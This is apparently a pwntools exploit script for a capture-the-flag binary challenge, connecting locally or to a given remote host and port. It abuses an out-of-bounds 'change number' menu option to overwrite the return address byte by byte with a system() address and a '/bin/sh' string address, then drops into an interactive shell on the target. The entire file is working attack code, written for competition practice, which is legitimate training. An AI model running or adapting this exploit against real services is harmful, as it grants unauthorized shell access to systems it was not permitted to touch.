#!/usr/bin/python
#__author__:TaQini

from pwn import *

local_file  = './3fb1a42837be485aae7d85d11fbc457b'
local_libc  = '/lib/x86_64-linux-gnu/libc.so.6'
remote_libc = '/lib/x86_64-linux-gnu/libc.so.6'

if len(sys.argv) == 1:
    p = process(local_file)
    libc = ELF(local_libc)
elif len(sys.argv) > 1:
    host, port = sys.argv[1].split(':')
    if len(sys.argv) == 3:
        host = sys.argv[1]
        port = sys.argv[2]
    p = remote(host, port)
    libc = ELF(remote_libc)

elf = ELF(local_file)

context.log_level = 'debug'
context.arch = elf.arch

se      = lambda data               :p.send(data) 
sa      = lambda delim,data         :p.sendafter(delim, data)
sl      = lambda data               :p.sendline(data)
sla     = lambda delim,data         :p.sendlineafter(delim, data)
sea     = lambda delim,data         :p.sendafter(delim, data)
rc      = lambda numb=4096          :p.recv(numb)
ru      = lambda delims, drop=True  :p.recvuntil(delims, drop)
uu32    = lambda data               :u32(data.ljust(4, '\0'))
uu64    = lambda data               :u64(data.ljust(8, '\0'))
info_addr = lambda tag, addr        :p.info(tag + ': {:#x}'.format(addr))

def debug(cmd=''):
    gdb.attach(p,cmd)

def change(n,v):
    p.recvuntil('5. exit\n')
    p.sendline('3')
    p.recvuntil('which number to change:\n')
    p.sendline(str(n))
    p.recvuntil('new number:\n')
    p.sendline(str(v))

p.recvuntil('How many numbers you have:\n')

p.sendline('1')
p.recvuntil('Give me your numbers\n')
#for i in range(100):
p.sendline('0')

system = 0x080485B4
sh = 0x8048987

change(132,0xB4)
change(133,0x85)
change(134,4)
change(135,8)

change(136,0x87)
change(137,0x89)
change(138,4)
change(139,8)

p.sendline('5')

p.interactive()

